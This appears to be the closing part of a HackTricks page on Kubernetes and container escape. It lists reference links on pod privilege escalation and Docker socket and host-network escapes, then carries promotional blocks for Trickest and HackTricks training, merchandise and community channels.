* [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
* [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
